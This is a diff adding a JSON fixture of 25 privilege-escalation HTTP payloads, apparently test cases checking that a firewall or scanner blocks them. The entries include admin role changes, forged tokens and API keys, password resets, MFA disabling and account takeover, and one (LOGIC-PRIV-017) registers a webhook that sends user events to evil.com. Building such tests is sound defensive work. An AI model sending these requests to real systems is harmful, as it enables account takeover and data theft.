@@ -1,0 +1,337 @@
+[
+  {
+      "id": "LOGIC-PRIV-001",
+      "payload": "POST /api/users/1 HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"role\":\"admin\"}",
+      "tags": [
+        "privilege",
+        "role-escalation",
+        "quick",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Direct role escalation to admin",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-002",
+      "payload": "PATCH /api/users/me HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"is_admin\":true}",
+      "tags": [
+        "privilege",
+        "self-escalation",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Self-escalation via is_admin flag",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-003",
+      "payload": "PUT /api/users/me HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"permissions\":[\"admin\",\"write\",\"delete\"]}",
+      "tags": [
+        "privilege",
+        "permission-override"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Permission array override for privilege escalation",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-004",
+      "payload": "POST /api/users/me/promote HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "privilege",
+        "promotion-endpoint"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Attempt to call promotion endpoint directly",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-005",
+      "payload": "POST /api/admin/grant-access HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"user_id\":2,\"role\":\"admin\"}",
+      "tags": [
+        "privilege",
+        "grant-access",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Attempt to grant admin access to another user",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-006",
+      "payload": "PUT /api/users/1/role HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"role\":\"superadmin\"}",
+      "tags": [
+        "privilege",
+        "superadmin"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Escalation to superadmin role",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-007",
+      "payload": "POST /api/users HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"username\":\"hacker\",\"role\":\"admin\",\"active\":true}",
+      "tags": [
+        "privilege",
+        "user-creation",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Create new user with admin role",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-008",
+      "payload": "PATCH /api/workflows/1 HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"owner_id\":1}",
+      "tags": [
+        "privilege",
+        "ownership-change"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Change workflow ownership (n8n-specific)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-009",
+      "payload": "POST /api/albums/1/share HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"user_id\":999,\"permission\":\"write\"}",
+      "tags": [
+        "privilege",
+        "sharing-abuse"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Grant write access to someone else's album (Immich)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-010",
+      "payload": "PUT /api/users/me HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"groups\":[\"administrators\"]}",
+      "tags": [
+        "privilege",
+        "group-escalation",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Add self to administrators group",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-011",
+      "payload": "POST /api/tokens HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"user_id\":1,\"scope\":\"admin\"}",
+      "tags": [
+        "privilege",
+        "token-forge"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Forge admin-scoped token for another user",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-012",
+      "payload": "PUT /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"allow_registration\":true,\"default_role\":\"admin\"}",
+      "tags": [
+        "privilege",
+        "settings-manipulation",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Manipulate settings to create admin accounts",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-013",
+      "payload": "POST /api/users/1/impersonate HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "privilege",
+        "impersonation"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Attempt to impersonate admin user",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-014",
+      "payload": "GET /api/admin/users HTTP/1.1\r\nHost: target.com\r\nX-Original-User-Id: 1\r\n\r\n",
+      "tags": [
+        "privilege",
+        "header-injection"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Header injection to impersonate admin",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-015",
+      "payload": "POST /api/execute-workflow HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"workflow_id\":1,\"as_user\":1}",
+      "tags": [
+        "privilege",
+        "execution-context"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Execute workflow in another user's context (n8n)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-016",
+      "payload": "DELETE /api/users/1/sessions HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "privilege",
+        "session-hijack"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Terminate other user's sessions (DoS attack)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-017",
+      "payload": "POST /api/webhooks/admin HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"url\":\"https://evil.com/collect\",\"events\":[\"user.created\",\"user.updated\"]}",
+      "tags": [
+        "privilege",
+        "webhook-abuse",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Register webhook for admin events",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-018",
+      "payload": "PUT /api/users/me HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"email\":\"admin@company.com\"}",
+      "tags": [
+        "privilege",
+        "email-takeover"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Change email to admin's email (account takeover)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-019",
+      "payload": "POST /api/reset-password HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"user_id\":1,\"new_password\":\"hacked123\"}",
+      "tags": [
+        "privilege",
+        "password-reset",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Reset another user's password without authorization",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-020",
+      "payload": "POST /api/api-keys HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"user_id\":1,\"permissions\":[\"admin\"]}",
+      "tags": [
+        "privilege",
+        "api-key-forge"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Create admin API key for another user",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-021",
+      "payload": "PATCH /api/organizations/1 HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"owner_id\":2}",
+      "tags": [
+        "privilege",
+        "org-takeover"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Change organization ownership (Authentik)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-022",
+      "payload": "POST /api/sudo HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"command\":\"grant_admin\",\"target_user\":2}",
+      "tags": [
+        "privilege",
+        "sudo-abuse"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Abuse sudo/elevation endpoint",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-023",
+      "payload": "PUT /api/features HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"admin_panel\":true,\"user_id\":2}",
+      "tags": [
+        "privilege",
+        "feature-flag"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Enable admin features via feature flags",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-024",
+      "payload": "POST /api/users/1/mfa/disable HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "privilege",
+        "mfa-disable"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Disable MFA for another user",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-PRIV-025",
+      "payload": "GET /api/admin/audit-logs HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "privilege",
+        "audit-access",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Access admin audit logs without authorization",
+      "destructive": false,
+      "category": "Logic"
+  }
+]
